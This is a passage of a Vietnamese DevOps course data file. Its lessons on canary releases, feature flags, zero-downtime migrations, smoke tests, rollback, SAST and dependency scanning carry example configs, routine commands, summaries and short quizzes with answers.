          "Chọn metric đúng quan trọng hơn chọn công cụ. Nên theo dõi tỷ lệ lỗi 5xx, độ trễ p95/p99 và một chỉ số nghiệp vụ như tỷ lệ đặt hàng thành công. So sánh canary với bản ổn định cùng thời điểm tốt hơn so với một ngưỡng cố định, vì traffic thay đổi theo giờ trong ngày."
        ]
      },
      {
        h: "Canary không cần Kubernetes",
        p: [
          "Canary không phải đặc quyền của Kubernetes. Với AWS, Application Load Balancer hỗ trợ weighted target group: chia ví dụ 95% về target group cũ và 5% về target group mới. Từ 10/2025, ECS có sẵn chiến lược canary và linear ngay trong service (trước đó là blue/green gốc từ 7/2025): chuyển một phần trăm traffic sang bản mới, chờ bake time, tự rollback khi CloudWatch alarm kích hoạt. Cách cũ là ECS kết hợp CodeDeploy với cấu hình như `CodeDeployDefault.ECSCanary10Percent5Minutes` vẫn còn gặp nhiều.",
          "Với Nginx trên VPS, có thể dùng trọng số `weight` trong upstream. Dù ở nền tảng nào, nguyên tắc vẫn là: phần nhỏ trước, đo, rồi mới mở rộng."
        ]
      }
    ],
    summary: [
      "Canary đưa bản mới cho một phần traffic nhỏ, tăng dần theo từng bước.",
      "Phân tích metric tự động quyết định tiếp tục hay rollback.",
      "Argo Rollouts: Rollout với `steps` và AnalysisTemplate truy vấn Prometheus.",
      "Muốn chia traffic chính xác cần traffic routing qua ingress, Gateway API hoặc mesh."
    ],
    pitfalls: [
      "Canary với rất ít traffic: vài request không đủ để kết luận bản mới tốt hay xấu.",
      "Chỉ theo dõi CPU, bỏ qua tỷ lệ lỗi và chỉ số nghiệp vụ.",
      "Không cấu hình traffic routing rồi ngạc nhiên vì 5% thực tế thành 10% do làm tròn theo pod."
    ],
    quiz: [
      {
        q: "Lợi ích chính của canary so với blue-green?",
        options: ["Rollback nhanh hơn blue-green","Không cần hệ thống giám sát","Không tốn thêm tài nguyên nào","Giới hạn số người dùng gặp bản lỗi"],
        answer: 3,
        explain: "Canary giảm số người bị ảnh hưởng. Nó cần giám sát tốt hơn, và blue-green thường rollback nhanh tương đương."
      },
      {
        q: "Trong AnalysisTemplate, điều gì xảy ra khi metric vượt `failureLimit`?",
        options: ["Rollout vẫn tiếp tục bước tiếp theo","Rollout bị abort, traffic về bản stable","Prometheus bị khởi động lại","Mọi pod của rollout bị xoá"],
        answer: 1,
        explain: "Phân tích thất bại khiến rollout abort và quay về phiên bản stable."
      },
      {
        q: "Không cấu hình traffic routing, Argo Rollouts chia traffic canary dựa vào gì?",
        options: ["Header HTTP", "Tỷ lệ số pod canary và stable", "Địa chỉ IP người dùng", "Ngẫu nhiên hoàn toàn"],
        answer: 1,
        explain: "Không có traffic router, việc chia dựa trên số pod nên chỉ xấp xỉ. Chia theo header cần traffic routing."
      }
    ]
  },
  "p08.m3.t3": {
    videos: [
      { id: "AJa2B-twtG4", title: "What are Feature Flags?", channel: "IBM Technology", lang: "en", minutes: 7, embed: true },
      { id: "ZJzQLSfuNUI", title: "OpenFeature Will CHANGE How You Deploy Code", channel: "Better Stack", lang: "en", minutes: 5, embed: true }
    ],
    sections: [
      {
        h: "Tách deploy khỏi release",
        p: [
          "Deploy là đưa code lên production. Release là cho người dùng thấy tính năng. Feature flag tách hai việc này ra: code mới được deploy nhưng nằm sau một điều kiện, và bạn bật nó khi muốn, cho ai muốn, không cần deploy lại.",
          "Nhờ vậy, deploy trở thành việc kỹ thuật an toàn có thể làm nhiều lần mỗi ngày, còn release là quyết định sản phẩm: bật cho nhân viên nội bộ, rồi 10% người dùng, rồi theo khu vực. Nếu tính năng có vấn đề, tắt flag nhanh hơn nhiều so với rollback cả deploy."
        ],
        list: [
          "Release flag: ẩn tính năng chưa xong, sống ngắn, xoá sau khi bật 100%.",
          "Experiment flag: A/B test, chia người dùng thành nhóm để so sánh.",
          "Ops flag (kill switch): tắt nhanh một tính năng nặng khi hệ thống quá tải.",
          "Permission flag: bật tính năng cho gói trả phí hoặc khách hàng cụ thể."
        ]
      },
      {
        h: "OpenFeature: API chuẩn, provider tuỳ chọn",
        p: [
          "OpenFeature là chuẩn mở (dự án CNCF) định nghĩa API đánh giá flag, không phụ thuộc nhà cung cấp. Code gọi OpenFeature, còn phía sau là provider: Unleash, LaunchDarkly, flagd, hoặc một provider trong bộ nhớ khi test. Đổi nhà cung cấp chỉ cần đổi provider.",
          "Ví dụ dưới dùng `InMemoryProvider` có sẵn trong SDK server cho Node. `targetingKey` là định danh người dùng, giúp nhà cung cấp chia phần trăm ổn định: cùng một người dùng luôn nhận cùng kết quả."
        ],
        code: {
          lang: "typescript",
          file: "src/flags.ts",
          src: `import { OpenFeature, InMemoryProvider } from '@openfeature/server-sdk';

// Production: thay bằng provider của Unleash, LaunchDarkly, flagd...
await OpenFeature.setProviderAndWait(
  new InMemoryProvider({
    'new-checkout': {
      disabled: false,
      variants: { on: true, off: false },
      defaultVariant: 'off',
    },
  }),
);

const flags = OpenFeature.getClient();

export async function isNewCheckout(userId: string): Promise<boolean> {
  // Giá trị mặc định false được dùng nếu provider lỗi hoặc không tìm thấy flag
  return flags.getBooleanValue('new-checkout', false, { targetingKey: userId });
}`
        }
      },
      {
        h: "Chi phí của feature flag",
        p: [
          "Mỗi flag là một nhánh điều kiện, và n flag tạo ra rất nhiều tổ hợp có thể chạy. Flag không được dọn là nợ kỹ thuật. Hãy đặt chủ sở hữu và ngày hết hạn cho mỗi flag, và tạo việc xoá flag ngay khi tạo nó.",
          "Giá trị mặc định phải là trạng thái an toàn: khi dịch vụ flag không truy cập được, ứng dụng dùng mặc định, thường là tắt tính năng mới. Test cần cover cả hai trạng thái bật và tắt của những flag đang hoạt động. Thay đổi flag trên production cũng là một thay đổi, nên cần có audit log để biết ai bật gì và lúc nào."
        ]
      }
    ],
    summary: [
      "Feature flag tách deploy (kỹ thuật) khỏi release (quyết định sản phẩm).",
      "Các loại: release, experiment, ops kill switch, permission.",
      "OpenFeature là API chuẩn; nhà cung cấp như Unleash, LaunchDarkly là provider.",
      "Mặc định phải an toàn, flag phải có chủ và được dọn khi xong."
    ],
    pitfalls: [
      "Flag tồn tại nhiều năm, không ai dám xoá vì không biết còn dùng không.",
      "Giá trị mặc định là bật, dịch vụ flag sập thì tính năng dở dang lộ ra cho mọi người.",
      "Chia phần trăm không có `targetingKey`, người dùng thấy tính năng lúc có lúc không."
    ],
    quiz: [
      {
        q: "Feature flag giúp tách hai việc nào?",
        options: ["Build và test", "Deploy và release", "Code và review", "Staging và dev"],
        answer: 1,
        explain: "Code được deploy nhưng tính năng chỉ được release khi bật flag."
      },
      {
        q: "Vai trò của OpenFeature là gì?",
        options: ["API chuẩn mở, đổi nhà cung cấp qua provider","Dịch vụ lưu flag trả phí của CNCF","Công cụ CI chạy test theo flag","Thư viện mock dùng khi viết test"],
        answer: 0,
        explain: "OpenFeature chuẩn hoá API phía ứng dụng; Unleash, LaunchDarkly... là provider phía sau."
      },
      {
        q: "Giá trị mặc định của flag cho tính năng mới nên là gì?",
        options: ["Bật, để người dùng thấy ngay","Tắt, giữ hành vi cũ khi có lỗi","Ngẫu nhiên theo từng request","Không cần giá trị mặc định"],
        answer: 1,
        explain: "Khi provider lỗi, ứng dụng dùng mặc định; mặc định tắt giữ hành vi cũ đã ổn định."
      }
    ]
  },
  "p08.m3.t4": {
    videos: [
      { id: "ONSCQWLD9d0", title: "Every engineer should know this.. (Expand-Contract Pattern)", channel: "Software Developer Diaries", lang: "en", minutes: 7, embed: true }
    ],
    sections: [
      {
        h: "Migration là bước riêng, chạy trước deploy",
        p: [
          "Migration database không nên chạy lúc ứng dụng khởi động. Khi có 4 replica cùng khởi động, cả 4 cùng cố chạy migration; nếu migration lâu, pod bị liveness probe giết và khởi động lại liên tục. Hãy chạy migration như một job riêng, đúng một lần, trước khi deploy code mới.",
          "Thứ tự chuẩn: migration chạy trước, code mới deploy sau. Vì vậy trong một khoảng thời gian, code cũ đang chạy trên schema mới. Đây là điều kiện then chốt: mọi migration phải tương thích ngược với phiên bản code đang chạy. Nếu không, ngay khi migration xong, bản đang chạy sẽ lỗi."
        ]
      },
      {
        h: "Expand–contract: đổi schema không downtime",
        p: [
          "Muốn đổi tên cột `name` thành `full_name`, bạn không thể làm trong một bước. Hãy chia thành nhiều lần deploy, mỗi lần đều an toàn với cả code cũ và code mới."
        ],
        list: [
          "Expand: thêm cột mới `full_name` cho phép NULL. Code cũ không biết cột này nên không sao.",
          "Deploy code ghi vào cả hai cột, đọc cột mới nếu có, không thì đọc cột cũ.",
          "Backfill: chép dữ liệu cũ sang cột mới theo từng lô nhỏ để tránh khoá bảng lâu.",
          "Deploy code chỉ dùng cột mới.",
          "Contract: khi chắc chắn không còn rollback về bản cũ, xoá cột `name`."
        ],
        code: {
          lang: "sql",
          file: "migrations/2026_09_01_expand_full_name.sql",
          src: `-- Bước expand: an toàn với code cũ
SET lock_timeout = '5s';          -- không chờ khoá quá lâu, lỗi sớm thay vì treo cả bảng
ALTER TABLE users ADD COLUMN full_name text;

-- Index tạo CONCURRENTLY để không chặn ghi (không chạy được trong transaction)
CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_users_full_name ON users (full_name);

-- Bước contract, ở một lần deploy SAU, khi không còn code đọc cột cũ:
-- ALTER TABLE users DROP COLUMN name;`
        }
      },
      {
        h: "Migration trong pipeline",
        p: [
          "Với GitOps và Argo CD, một cách phổ biến là Kubernetes Job gắn hook PreSync: Argo CD chạy job migration trước khi áp dụng Deployment mới; job lỗi thì sync dừng lại và code mới không được deploy. Job dùng chính image của phiên bản sắp deploy để chạy lệnh migration."
        ],
        code: {
          lang: "yaml",
          file: "k8s/migrate-job.yaml",
          src: `apiVersion: batch/v1
kind: Job
metadata:
  name: task-api-migrate
  annotations:
    argocd.argoproj.io/hook: PreSync
    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation
spec:
  backoffLimit: 0            # lỗi thì dừng, không tự chạy lại migration
  activeDeadlineSeconds: 600
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: migrate
          image: ghcr.io/my-org/task-api:a1b2c3d
          command: ["npx", "prisma", "migrate", "deploy"]
          envFrom:
            - secretRef:
                name: task-api-db`
        }
      },
      {
        h: "Đánh đổi",
        p: [
          "Expand–contract tốn nhiều lần deploy hơn cho một thay đổi, nhưng đổi lại mỗi bước đều có thể rollback code mà không hỏng. Với pipeline không có GitOps, migration là một job hoặc step trước bước deploy, như Lab 04 chạy ECS one-off task. Tài khoản database dùng cho migration nên khác tài khoản ứng dụng: chỉ migration mới có quyền đổi schema."
        ]
      }
    ],
    summary: [
      "Chạy migration như một job riêng, đúng một lần, trước khi deploy code mới.",
      "Migration phải tương thích ngược với code đang chạy.",
      "Dùng expand–contract để đổi schema qua nhiều lần deploy an toàn.",
      "Với Argo CD, dùng Job có hook PreSync; lỗi thì sync dừng."
    ],
    pitfalls: [
      "Chạy migration lúc ứng dụng khởi động, nhiều replica tranh nhau chạy và pod bị restart liên tục.",
      "Xoá hoặc đổi tên cột trong cùng lần deploy với code mới, code cũ đang chạy lỗi ngay.",
      "ALTER TABLE trên bảng lớn không đặt `lock_timeout`, chờ khoá và chặn toàn bộ truy vấn khác."
    ],
    quiz: [
      {
        q: "Vì sao migration phải tương thích ngược với code cũ?",
        options: ["Vì database không hỗ trợ migration mới","Vì Prisma bắt buộc mọi migration như vậy","Vì code cũ vẫn chạy trên schema mới một thời gian","Vì migration luôn chạy sau khi deploy code"],
        answer: 2,
        explain: "Migration chạy trước deploy nên có khoảng thời gian code cũ chạy trên schema mới, và rollback code cũng cần schema tương thích. Thứ tự chuẩn là migration trước, code sau, không phải ngược lại."
      },
      {
        q: "Trong expand–contract, khi nào xoá cột cũ?",
        options: ["Ngay trong migration đầu tiên","Trước khi thêm cột mới","Không bao giờ được xoá","Khi không còn code nào dùng hoặc cần rollback về"],
        answer: 3,
        explain: "Contract là bước cuối, chỉ làm khi chắc chắn mọi phiên bản đang chạy hoặc có thể rollback về đều không cần cột cũ."
      },
      {
        q: "Annotation `argocd.argoproj.io/hook: PreSync` trên Job có tác dụng gì?",
        options: ["Chạy Job sau khi deploy xong","Chạy Job trước các resource khác khi sync","Xoá Job ngay sau khi tạo","Bỏ qua Job trong lần sync"],
        answer: 1,
        explain: "PreSync hook chạy trước pha sync chính. Nếu Job lỗi, sync dừng và code mới không được áp dụng."
      }
    ]
  },
  "p08.m3.t5": {
    sections: [
      {
        h: "Deploy xong chưa có nghĩa là chạy được",
        p: [
          "Pipeline báo xanh khi lệnh deploy thành công, nhưng điều đó chỉ nghĩa là hệ thống đã nhận cấu hình mới. Có thể ứng dụng không kết nối được database vì sai secret, một route quan trọng trả 500, hay CDN còn cache bản cũ. Smoke test là bộ kiểm tra nhanh, vài chục giây, gọi những chức năng then chốt ngay sau deploy để trả lời câu hỏi: có cháy không?",
          "Smoke test khác e2e test: nó ngắn, chỉ kiểm tra đường chính, chạy được trên production mà không làm bẩn dữ liệu thật. Ví dụ: `/health` trả ok, đăng nhập bằng tài khoản kiểm thử, gọi một API đọc dữ liệu."
        ]
      },
      {
        h: "Health check: live và ready",
        list: [
          "Liveness (`/health/live`): tiến trình còn sống không, lỗi thì restart container. Không nên kiểm tra dịch vụ phụ thuộc.",
          "Readiness (`/health/ready`): đã sẵn sàng nhận traffic chưa, ví dụ đã kết nối database. Lỗi thì rút khỏi load balancer.",
          "Endpoint trả về phiên bản (`/version` hoặc trong `/health`) giúp smoke test xác nhận đúng commit SHA vừa deploy đang chạy."
        ],
        p: [
          "Kiểm tra phiên bản rất đáng làm. Có những lúc deploy \"thành công\" nhưng pod mới không bao giờ lên và bản cũ vẫn phục vụ; smoke test gọi `/health` vẫn xanh. So sánh SHA sẽ bắt được trường hợp này."
        ]
      },
      {
        h: "Smoke test và rollback tự động trong pipeline",
        p: [
          "Job dưới chờ rollout hoàn tất, chạy smoke test có retry, xác nhận phiên bản, và nếu bất kỳ bước nào lỗi thì tự `kubectl rollout undo`."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/deploy.yml (job verify)",
          src: `jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write
      contents: read
    env:
      BASE_URL: https://api.example.com
      EXPECTED_SHA: \${{ github.sha }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      # (Bỏ qua cho gọn: bước lấy credential cloud qua OIDC và cấu hình kubeconfig)
      - name: Deploy
        run: |
          kubectl set image deployment/task-api api=ghcr.io/my-org/task-api:\${GITHUB_SHA::7}
          kubectl rollout status deployment/task-api --timeout=5m
      - name: Smoke test
        run: |
          for i in $(seq 1 10); do
            curl -fsS "$BASE_URL/health/ready" && break
            [ "$i" -eq 10 ] && exit 1
            sleep 6
          done
          curl -fsS "$BASE_URL/version" | grep -q "\${EXPECTED_SHA::7}"
          curl -fsS -o /dev/null "$BASE_URL/v1/projects?limit=1"
      - name: Rollback nếu thất bại
        if: failure()
        run: |
          kubectl rollout undo deployment/task-api
          kubectl rollout status deployment/task-api --timeout=5m`
        }
      },
      {
        h: "Sau smoke test: theo dõi metric",
        p: [
          "Smoke test bắt lỗi rõ ràng trong vài chục giây. Lỗi tinh vi hơn như tỷ lệ lỗi tăng từ 0,1% lên 2% hay rò rỉ bộ nhớ chỉ lộ ra sau vài phút đến vài giờ. Vì vậy sau smoke test nên có giai đoạn theo dõi metric (bake time), thủ công qua dashboard hoặc tự động qua canary analysis như bài trước."
        ]
      }
    ],
    summary: [
      "Smoke test là kiểm tra nhanh các chức năng then chốt ngay sau deploy.",
      "Tách liveness và readiness; readiness mới kiểm tra phụ thuộc.",
      "Xác nhận phiên bản đang chạy khớp commit SHA vừa deploy.",
      "Smoke test lỗi thì rollback tự động; sau đó tiếp tục theo dõi metric."
    ],
    pitfalls: [
      "Smoke test chỉ gọi `/health` của bản cũ vẫn đang chạy, báo xanh giả.",
      "Liveness probe kiểm tra database, database chậm làm mọi pod bị restart hàng loạt.",
      "Smoke test tạo dữ liệu thật trên production mà không dọn, hoặc dùng tài khoản thật của khách hàng."
    ],
    quiz: [
      {
        q: "Khác biệt chính giữa smoke test và e2e test?",
        options: ["Smoke test chỉ chạy trên máy developer","Smoke test ngắn, chỉ kiểm tra đường chính sau deploy","E2e test không cần môi trường để chạy","Smoke test bao quát mọi luồng như e2e"],
        answer: 1,
        explain: "Smoke test nhanh và an toàn để chạy trên production; e2e test bao quát hơn, chạy lâu hơn, thường trên staging."
      },
      {
        q: "Vì sao smoke test nên kiểm tra phiên bản đang chạy?",
        options: ["Để bắt trường hợp bản cũ vẫn đang phục vụ","Để log deploy dễ đọc hơn","Vì Kubernetes yêu cầu endpoint /version","Để quá trình deploy nhanh hơn"],
        answer: 0,
        explain: "Nếu chỉ gọi health check, bản cũ vẫn trả ok. So sánh SHA xác nhận đúng bản mới đang chạy."
      },
      {
        q: "Probe nào nên kiểm tra kết nối database?",
        options: ["Liveness", "Readiness", "Cả hai", "Không probe nào"],
        answer: 1,
        explain: "Readiness quyết định có nhận traffic; mất database thì rút khỏi load balancer. Liveness kiểm tra database sẽ gây restart hàng loạt vô ích."
      }
    ]
  },
  "p08.m3.t6": {
    sections: [
      {
        h: "Rollback: quay về phiên bản đã biết là tốt",
        p: [
          "Rollback là đưa hệ thống về phiên bản trước đó khi phiên bản mới gây sự cố. Nhờ build once, deploy many và image tag theo SHA, rollback về bản chất chỉ là deploy lại image SHA cũ, không cần build lại gì cả. Mục tiêu là khôi phục dịch vụ nhanh nhất; tìm nguyên nhân để sau.",
          "Hãy luyện rollback như luyện phòng cháy. Nếu đội chưa từng rollback, lần đầu thường là lúc 2 giờ sáng trong sự cố, và đó là lúc tệ nhất để khám phá rằng lệnh rollback không chạy."
        ]
      },
      {
        h: "Các cách rollback theo nền tảng",
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Kubernetes Deployment: xem lịch sử và quay về
kubectl rollout history deployment/task-api
kubectl rollout undo deployment/task-api                 # về revision ngay trước
kubectl rollout undo deployment/task-api --to-revision=3 # về revision cụ thể
kubectl rollout status deployment/task-api --timeout=5m

# Helm
helm history task-api -n production
helm rollback task-api 12 -n production

# Argo Rollouts: huỷ canary đang chạy, quay về bản stable
kubectl argo rollouts abort task-api

# GitOps (Argo CD / Flux): rollback bằng Git
git revert <sha-commit-bump-image>
git push`
        },
        p: [
          "Với GitOps, không nên dùng `kubectl rollout undo` vì Argo CD với selfHeal sẽ đưa cluster về đúng trạng thái trong Git, tức lại là bản lỗi. Rollback đúng cách là `git revert` commit đã cập nhật tag image. Argo CD cũng không cho `argocd app rollback` khi đang bật auto-sync."
        ]
      },
      {
        h: "Khi không thể rollback: roll forward",
        p: [
          "Rollback code chỉ an toàn khi schema database vẫn tương thích với code cũ. Nếu bản mới đã chạy một migration không đảo ngược được, ví dụ đã xoá cột hoặc chuyển dữ liệu sang định dạng mới và dữ liệu mới đã được ghi, thì quay về code cũ sẽ làm hỏng thêm. Khi đó bạn roll forward: sửa lỗi nhanh và deploy một phiên bản mới.",
          "Roll forward cần pipeline nhanh; nếu pipeline mất 45 phút thì roll forward là một cực hình. Cách tốt nhất là thiết kế để luôn rollback được: migration expand–contract, feature flag để tắt tính năng lỗi không cần deploy, và giữ đủ image cũ trong registry."
        ],
        list: [
          "Tính năng mới lỗi, có flag: tắt flag, nhanh nhất.",
          "Code lỗi, schema vẫn tương thích: rollback về image SHA trước.",
          "Migration không đảo ngược được đã chạy: roll forward với bản sửa."
        ]
      },
      {
        h: "Tự động hoá quyết định rollback",
        p: [
          "Rollback càng tự động thì failed deployment recovery time càng ngắn. Smoke test lỗi thì rollback ngay trong pipeline; canary analysis lỗi thì Argo Rollouts tự abort; alert tỷ lệ lỗi sau deploy thì người trực có sẵn runbook một lệnh. Mỗi deploy nên ghi lại image SHA trước đó để biết chính xác quay về đâu.",
          "Định kỳ tổ chức diễn tập: cố ý deploy một bản lỗi lên staging và đo thời gian từ lúc phát hiện tới lúc khôi phục. Con số này chính là chỉ số failed deployment recovery time của DORA ở quy mô nhỏ."
        ]
      }
    ],
    summary: [
      "Rollback là deploy lại image SHA trước đó, không build lại.",
      "Kubernetes: `kubectl rollout undo`; Helm: `helm rollback`; GitOps: `git revert`.",
      "Migration không đảo ngược được buộc phải roll forward.",
      "Luyện rollback thường xuyên và thiết kế để luôn rollback được."
    ],
    pitfalls: [
      "Dùng `kubectl rollout undo` trên cluster do Argo CD quản lý, selfHeal đưa bản lỗi trở lại.",
      "Lifecycle policy registry đã xoá image cũ, không còn gì để rollback.",
      "Rollback code sau khi migration đã xoá cột, code cũ lỗi ngay khi đọc cột không còn."
    ],
    quiz: [
      {
        q: "Cluster được Argo CD quản lý với selfHeal bật. Cách rollback đúng là gì?",
        options: ["kubectl rollout undo trên Deployment","Sửa Deployment bằng kubectl edit","git revert commit đổi tag image rồi push","Xoá namespace rồi để Argo CD tạo lại"],
        answer: 2,
        explain: "Git là nguồn sự thật; thay đổi trực tiếp trên cluster bị selfHeal hoàn tác. git revert khiến Argo CD tự đồng bộ về bản cũ."
      },
      {
        q: "Khi nào phải roll forward thay vì rollback?",
        options: ["Khi tính năng lỗi có feature flag","Khi migration không đảo ngược được đã chạy","Khi pipeline chạy rất nhanh","Khi hệ thống chạy trên Kubernetes"],
        answer: 1,
        explain: "Code cũ không chạy được trên schema mới nên quay lại sẽ lỗi thêm. Có feature flag thì thường chỉ cần tắt flag."
      },
      {
        q: "Lệnh nào quay Deployment về revision ngay trước đó?",
        options: ["kubectl rollout restart deployment/task-api","kubectl rollout undo deployment/task-api","kubectl delete deployment task-api","kubectl scale deployment/task-api --replicas=0"],
        answer: 1,
        explain: "`rollout undo` quay về revision trước. `restart` chỉ khởi động lại pod cùng phiên bản; delete và scale 0 gây downtime."
      }
    ]
  },
  "p08.m4.t0": {
    videos: [
      { id: "wqErjqFgEa0", title: "The Ultimate SAST Guide: What is Static Application Security Testing? Code Security with Mackenzie", channel: "Aikido Security", lang: "en", minutes: 13, embed: true }
    ],
    sections: [
      {
        h: "SAST: tìm lỗ hổng bằng cách đọc mã",
        p: [
          "SAST (Static Application Security Testing) phân tích mã nguồn mà không cần chạy ứng dụng. Công cụ theo dõi luồng dữ liệu từ nguồn không tin cậy (request body, query string) tới điểm nguy hiểm (câu SQL ghép chuỗi, lệnh shell, đường dẫn file) và báo khi dữ liệu đi tới đó mà không được kiểm tra. Nhờ vậy nó bắt được SQL injection, command injection, path traversal, dùng thuật toán mã hoá yếu, hard-code secret.",
          "Vì chạy trên mã nguồn, SAST chạy được ngay trên mỗi PR, rất sớm trong vòng đời, khi sửa lỗi còn rẻ. Đây là ý nghĩa của shift left: đưa kiểm tra bảo mật về phía developer thay vì đợi pentest trước khi release."
        ]
      },
      {
        h: "CodeQL và Semgrep",
        list: [
          "CodeQL (GitHub): biến mã thành cơ sở dữ liệu rồi truy vấn, phân tích luồng dữ liệu sâu. Miễn phí cho repo public; repo private cần mua GitHub Code Security (trước 2025 nằm trong GitHub Advanced Security). Có chế độ default setup bật bằng vài cú click, không cần viết YAML.",
          "Semgrep: quy tắc viết giống mã nguồn nên dễ đọc và tự viết thêm; chạy nhanh; có bộ quy tắc cộng đồng như `p/owasp-top-ten`. Hợp để thêm quy tắc riêng của công ty, ví dụ cấm gọi một hàm nội bộ đã deprecated."
        ],
        p: [
          "Kết quả xuất ra định dạng SARIF (chuẩn JSON chung cho kết quả phân tích tĩnh) có thể tải lên tab Security của GitHub để hiển thị ngay trên dòng code trong PR. Job cần quyền `security-events: write` để tải kết quả lên."
        ]
      },
      {
        h: "Ví dụ workflow",
        p: [
          "Semgrep chạy trong container chính thức và lỗi khi có phát hiện. CodeQL dùng action của GitHub, pin theo SHA như mọi action khác; Dependabot sẽ giúp cập nhật. Quyền `actions: read` chỉ cần với repo private."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/sast.yml",
          src: `name: SAST
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep   # nên pin theo digest @sha256:...
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: semgrep scan --config p/owasp-top-ten --config p/typescript --error

  codeql:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write   # tải kết quả SARIF lên tab Security
      actions: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: github/codeql-action/init@2892aa5e19bbd11bc0cff5427e3b750a04d9e3c2 # v4.38.2
        with:
          languages: javascript-typescript
      - uses: github/codeql-action/analyze@2892aa5e19bbd11bc0cff5427e3b750a04d9e3c2 # v4.38.2`
        }
      },
      {
        h: "Sống chung với false positive",
        p: [
          "SAST luôn có false positive. Nếu bật chặn mọi phát hiện ngay ngày đầu với một codebase cũ, đội sẽ ngập trong cảnh báo và học cách bỏ qua. Chiến lược hợp lý: chỉ chặn phát hiện mới trong PR (diff-aware), xử lý dần phần tồn đọng, bắt đầu với quy tắc độ chính xác cao. Khi đánh dấu một phát hiện là false positive, ghi rõ lý do để người sau hiểu.",
          "SAST không thay thế được code review và không thấy lỗi logic nghiệp vụ như kiểm tra quyền thiếu ở một endpoint. Nó là một lớp trong nhiều lớp bảo vệ."
        ]
      }
    ],
    summary: [
      "SAST phân tích mã nguồn tĩnh, theo dõi dữ liệu không tin cậy tới điểm nguy hiểm.",
      "Chạy trên mỗi PR để phát hiện sớm (shift left).",
      "CodeQL phân tích sâu, tích hợp GitHub; Semgrep nhanh, dễ viết quy tắc riêng.",
      "Kết quả SARIF hiển thị trên PR, cần quyền `security-events: write`."
    ],
    pitfalls: [
      "Bật chặn toàn bộ trên codebase cũ, đội ngập cảnh báo và tắt công cụ.",
      "Đánh dấu false positive hàng loạt mà không ghi lý do.",
      "Nghĩ rằng SAST xanh là ứng dụng an toàn, bỏ qua lỗi phân quyền và logic nghiệp vụ."
    ],
    quiz: [
      {
        q: "SAST phân tích cái gì?",
        options: ["Ứng dụng đang chạy qua HTTP", "Mã nguồn mà không cần chạy ứng dụng", "Chỉ dependency", "Chỉ Docker image"],
        answer: 1,
        explain: "SAST là phân tích tĩnh mã nguồn. Quét ứng dụng đang chạy là DAST; quét dependency là SCA."
      },
      {
        q: "Quyền nào cần để job tải kết quả CodeQL/SARIF lên tab Security?",
        options: ["packages: write", "security-events: write", "id-token: write", "pages: write"],
        answer: 1,
        explain: "`security-events: write` cho phép tải cảnh báo quét mã. Các quyền khác dành cho package, OIDC và Pages."
      },
      {
        q: "Chiến lược hợp lý khi đưa SAST vào codebase cũ có nhiều cảnh báo?",
        options: ["Chặn mọi PR đến khi sửa hết tồn đọng","Không bao giờ chặn, chỉ báo cáo","Tắt SAST cho tới khi refactor xong","Chỉ chặn phát hiện mới, xử lý dần tồn đọng"],
        answer: 3,
        explain: "Chặn phát hiện mới ngăn tình trạng xấu thêm mà không làm tê liệt đội. Chặn tất cả hoặc không chặn gì đều kém hiệu quả."
      }
    ]
  },
  "p08.m4.t1": {
    videos: [
      { id: "njm1nZlrR68", title: "Supply Chain Security - The Ultimate Guide to Software Composition Analysis (SCA) Tools", channel: "Aikido Security", lang: "en", minutes: 14, embed: true }
    ],
    sections: [
      {
        h: "SCA: phần lớn mã của bạn là của người khác",
        p: [
          "Một dự án Node trung bình có hàng trăm đến hàng nghìn package trong `node_modules`, phần lớn là dependency gián tiếp mà bạn không trực tiếp chọn. SCA (Software Composition Analysis) đối chiếu danh sách dependency, lấy từ lockfile, với cơ sở dữ liệu lỗ hổng đã biết (CVE, GitHub Advisory Database, OSV) và báo package nào có lỗ hổng, mức độ nghiêm trọng và phiên bản đã vá.",
          "SCA cũng giúp phát hiện rủi ro giấy phép (license) và package đã bị bỏ rơi. Ngoài lỗ hổng vô tình, còn có tấn công chuỗi cung ứng: package bị chiếm quyền và phát hành bản độc hại. Lockfile và `npm ci` đảm bảo bạn cài đúng phiên bản đã được xem xét."
        ]
      },
      {
        h: "Công cụ phổ biến",
        list: [
          "`npm audit`: có sẵn, dùng GitHub Advisory Database; `--audit-level=high` chỉ lỗi khi có mức high trở lên, `--omit=dev` bỏ qua devDependencies.",
          "OSV-Scanner (Google): đọc lockfile của nhiều hệ sinh thái, dùng cơ sở dữ liệu OSV.",
          "Dependabot: vừa cảnh báo, vừa tự mở PR nâng phiên bản; cấu hình qua `.github/dependabot.yml`.",
          "Snyk: dịch vụ thương mại, có thêm gợi ý sửa và phân tích khả năng lỗ hổng bị gọi tới (reachability)."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Lỗi nếu có lỗ hổng high/critical trong dependency chạy production
npm audit --omit=dev --audit-level=high

# Kiểm tra chữ ký registry và provenance của package đã cài
npm audit signatures

# OSV-Scanner v2 quét toàn bộ repo
osv-scanner scan source -r .`
        },
        p: [
          "Trong CI, chạy SCA trên mỗi PR (để PR thêm dependency lỗi bị chặn) và chạy theo lịch hằng ngày (vì lỗ hổng mới được công bố cho cả code không đổi)."
        ]
      },
      {
        h: "Dependabot giữ dependency luôn mới",
        p: [
          "Cách chống lỗ hổng hiệu quả nhất là không để dependency quá cũ. Dependabot mở PR nâng phiên bản, CI của bạn kiểm tra PR đó. Gom nhóm bản cập nhật nhỏ giúp giảm số PR. Đừng quên ecosystem `github-actions` để Dependabot cập nhật cả SHA của action."
        ],
        code: {
          lang: "yaml",
          file: ".github/dependabot.yml",
          src: `version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10
    groups:
      minor-and-patch:
        update-types: [minor, patch]

  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly

  - package-ecosystem: docker
    directory: /
    schedule:
